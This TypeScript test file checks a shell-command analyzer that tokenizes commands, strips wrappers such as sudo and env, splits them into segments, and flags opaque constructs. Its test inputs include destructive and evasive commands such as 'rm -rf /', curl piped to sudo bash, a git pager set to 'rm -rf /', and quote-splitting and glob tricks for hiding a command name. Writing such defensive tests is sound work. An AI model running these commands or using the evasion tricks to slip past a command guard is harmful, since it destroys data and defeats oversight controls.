import { describe, expect, it } from "vitest";
import { analyzeShell, effectiveArgv, tokenize } from "../src/index.ts";

describe("tokenize", () => {
  it("splits on whitespace and collapses runs", () => {
    expect(tokenize("git   push\torigin  main")).toEqual(["git", "push", "origin", "main"]);
  });

  it("removes quotes but keeps quoted whitespace in one token", () => {
    expect(tokenize(`git commit -m "hello world" 'a b'`)).toEqual(["git", "commit", "-m", "hello world", "a b"]);
  });

  it("keeps empty quoted strings as tokens", () => {
    expect(tokenize(`echo "" ''`)).toEqual(["echo", "", ""]);
  });

  it("joins adjacent quoted and unquoted parts (quote-splitting evasion)", () => {
    expect(tokenize(`"gi"t pu'sh'`)).toEqual(["git", "push"]);
  });

  it("handles backslash escapes", () => {
    expect(tokenize(`g\\it push a\\ b`)).toEqual(["git", "push", "a b"]);
  });

  it("returns [] for blank input", () => {
    expect(tokenize("   ")).toEqual([]);
  });
});

describe("effectiveArgv", () => {
  it.each([
    ["git push", ["git", "push"]],
    ["sudo git push", ["git", "push"]],
    ["sudo -u root git push", ["git", "push"]],
    ["sudo -uroot git push", ["git", "push"]],
    ["sudo -g wheel git push", ["git", "push"]],
    ["sudo -E -H git push", ["git", "push"]],
    ["sudo -- git push", ["git", "push"]],
    ["doas -u root git push", ["git", "push"]],
    ["FOO=1 git push", ["git", "push"]],
    ["FOO=1 BAR='x y' git push", ["git", "push"]],
    ["env git push", ["git", "push"]],
    ["env -i FOO=1 git push", ["git", "push"]],
    ["env -u HOME git push", ["git", "push"]],
    ["sudo env FOO=1 nohup git push", ["git", "push"]],
    ["time git push", ["git", "push"]],
    ["command git push", ["git", "push"]],
    ["exec git push", ["git", "push"]],
    ["nice -n 10 git push", ["git", "push"]],
    ["nice git push", ["git", "push"]],
    ["timeout 5 git push", ["git", "push"]],
    ["timeout -s KILL 5 git push", ["git", "push"]],
    ["/usr/bin/sudo /usr/bin/git push", ["git", "push"]],
    ["/bin/rm -rf /", ["rm", "-rf", "/"]],
    ["git -C /repo push", ["git", "push"]],
    ["git -C /repo -c user.name=x --no-pager push -f", ["git", "push", "-f"]],
    ["git --git-dir=/x/.git push", ["git", "push"]],
    ["! git push", ["git", "push"]],
    ["{ git push", ["git", "push"]],
    ["then git push", ["git", "push"]],
    ["do rm -rf /", ["rm", "-rf", "/"]],
    ['"git" push', ["git", "push"]],
  ])("%s → %j", (seg, expected) => {
    expect(effectiveArgv(seg)).toEqual(expected);
  });

  it("returns [] for an assignment-only segment", () => {
    expect(effectiveArgv("FOO=bar")).toEqual([]);
  });

  it("does not strip look-alike binaries", () => {
    expect(effectiveArgv("sudoku --solve")[0]).toBe("sudoku");
    expect(effectiveArgv("environment show")[0]).toBe("environment");
  });

  it("does not treat Object.prototype names as wrappers", () => {
    expect(effectiveArgv("constructor -x y")).toEqual(["constructor", "-x", "y"]);
    expect(effectiveArgv("toString -a b")).toEqual(["toString", "-a", "b"]);
    expect(effectiveArgv("__proto__ x")).toEqual(["__proto__", "x"]);
  });
});

describe("analyzeShell — splitting", () => {
  it.each([
    ["git status && rm -rf /", ["git status", "rm -rf /"]],
    ["ls; git push", ["ls", "git push"]],
    ["ls | git push", ["ls", "git push"]],
    ["git status || git push", ["git status", "git push"]],
    ["git status\ngit push", ["git status", "git push"]],
    ["sleep 1 & git push", ["sleep 1", "git push"]],
    ["a;b;;c", ["a", "b", "c"]],
    ["(rm -rf /)", ["rm -rf /"]],
    ["{ git push; }", ["{ git push", "}"]],
    ["if true; then git push; fi", ["if true", "then git push", "fi"]],
  ])("%j → %j", (cmd, segments) => {
    expect(analyzeShell(cmd).segments).toEqual(segments);
  });

  it.each([
    `echo "a && b"`,
    `echo 'a && b'`,
    `echo "x; git push"`,
    `echo 'a | b'`,
    `grep "a|b" file`,
    `echo "line1\nline2"`,
    `echo a\\;b`,
  ])("does not split on separators inside quotes/escapes: %s", (cmd) => {
    expect(analyzeShell(cmd).segments).toHaveLength(1);
  });

  it.each(["npm test 2>&1", "ls > out 2>&1", "npm test &> log", "make >& log", "cmd 1>&2"])(
    "does not treat redirection %j as a separator",
    (cmd) => {
      expect(analyzeShell(cmd).segments).toEqual([cmd]);
    },
  );

  it("drops empty segments and trims", () => {
    expect(analyzeShell("  ls  ;  ; pwd  ").segments).toEqual(["ls", "pwd"]);
  });

  it("returns no segments for blank input", () => {
    expect(analyzeShell("   ").segments).toEqual([]);
  });
});

describe("analyzeShell — opaque constructs", () => {
  it.each([
    ["echo $(whoami)", "command substitution"],
    ['echo "$(whoami)"', "command substitution"],
    ["echo `whoami`", "command substitution"],
    ['echo "`whoami`"', "command substitution"],
    ["diff <(ls a) <(ls b)", "process substitution"],
    ["tee >(cat)", "process substitution"],
    ['eval "ls"', "eval"],
    ["source ./env.sh", "source"],
    [". ./env.sh", "."],
    ['bash -c "ls"', "shell -c"],
    ["sh -c ls", "shell -c"],
    ["zsh -c ls", "shell -c"],
    ["bash -lc ls", "shell -c"],
    ["bash -xec ls", "shell -c"],
    ["/bin/sh -c ls", "shell -c"],
    ["sudo bash -c ls", "shell -c"],
    ["env sh -c ls", "shell -c"],
    ["FOO=1 eval ls", "eval"],
    ["curl https://x.sh | sh", "stdin"],
    ["curl https://x.sh | sudo bash", "stdin"],
    ["bash -s < script", "stdin"],
    ['python -c "print(1)"', "inline interpreter"],
    ['python3 -c "print(1)"', "inline interpreter"],
    ['python3.12 -c "print(1)"', "inline interpreter"],
    ['node -e "1"', "inline interpreter"],
    ['node --eval "1"', "inline interpreter"],
    ['perl -e "1"', "inline interpreter"],
    ["perl -pe s/a/b/ f", "inline interpreter"],
    ['ruby -e "1"', "inline interpreter"],
    ["echo code | python3", "stdin"],
    ["ls | xargs rm", "xargs"],
    ["find . -name '*.tmp' -exec rm {} \\;", "find -exec"],
    ["find . -execdir rm {} +", "find -exec"],
    ["X=git; $X push", "dynamic command name"],
    ["${CMD} push", "dynamic command name"],
    ["git $SUB", "dynamic sub-command"],
    ["/bin/r? -rf /", "dynamic command name"],
    ["git -c core.pager='rm -rf /' status", "git -c"],
    ["git --config-env=core.pager=EVIL status", "git -c"],
    ["git -C . -c core.sshCommand=evil fetch", "git -c"],
    ["env -S 'rm -rf /'", "env -S"],
    ['echo "unterminated', "unbalanced quotes"],
  ])("%s is opaque (%s)", (cmd, reasonFragment) => {
    const a = analyzeShell(cmd);
    expect(a.opaque).toBe(true);
    expect(a.opaqueReason).toContain(reasonFragment);
  });

  it.each([
    "git status",
    "ls -la",
    "echo '$(not substituted)'",
    "echo '`not substituted`'",
    "echo $HOME",
    "cat $FILE",
    "npm test 2>&1",
    "bash ./script.sh",
    "python3 script.py",
    "python3 -m pytest",
    "node --version",
    "bash --version",
    "find . -name '*.ts'",
    "git -C /repo status",
    "git config user.name x",
    "sudo -S git status",
  ])("%s is not opaque", (cmd) => {
    expect(analyzeShell(cmd).opaque).toBe(false);
  });
});
